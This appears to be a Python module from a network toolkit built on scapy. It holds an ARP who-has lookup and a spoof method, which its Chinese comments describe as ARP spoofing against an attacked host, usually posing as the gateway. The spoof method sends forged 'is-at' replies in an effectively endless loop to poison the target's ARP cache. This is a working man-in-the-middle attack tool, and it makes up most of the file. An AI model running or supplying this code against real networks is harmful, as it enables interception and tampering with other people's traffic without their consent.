import sys

from scapy.layers.l2 import *

from Network.Tools import Tools


class Arp:

    Verbose = bool(Tools.get_property('verbose'))

    def __init__(self, ether_name, timeout):
        self.__ether_name = ether_name
        self.__mac, self.__ip = Tools.get_network_info(self.__ether_name)
        self.__timeout = timeout


    def who_has(self, pdst):
        """
        arp协议中的who-has命令，使用arp协议获取指定ip地址的mac地址
        :param pdst: 目标ip地址
        :return: 目标ip地址对应的mac地址
        """
        arp_packet = Ether(dst=Tools.Ether_BoardCast,
                           src=self.__mac) / \
                     ARP(op='who-has', hwsrc=self.__mac, psrc=self.__ip,
                         hwdst=Tools.Ether_Empty, pdst=pdst)

        response = srp1(arp_packet, iface=self.__ether_name,
                        timeout=self.__timeout, verbose=Arp.Verbose)

        return response.getlayer(ARP).hwsrc if response else None


    def spoof(self, pdst,  pfake, interval=0.2, hwdst=None):
        """
        arp欺骗
        :param pdst: 被攻击的主机ip地址
        :param hwdst: 被攻击的主机mac地址
        :param pfake: 伪装的ip地址，一般为网关地址
        :param interval: arp请求发送间隔
        """
        if hwdst is None:
            hwdst = self.who_has(pdst)

        arp_packet = Ether(src=self.__mac, dst=hwdst) / \
                     ARP(op='is-at', hwsrc=self.__mac, psrc=pfake,
                         hwdst=hwdst, pdst=pdst)
        sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
              interval=interval, verbose=Arp.Verbose)


class InteractionArp:

    @staticmethod
    def run():
        pass


if __name__ == '__main__':
    pass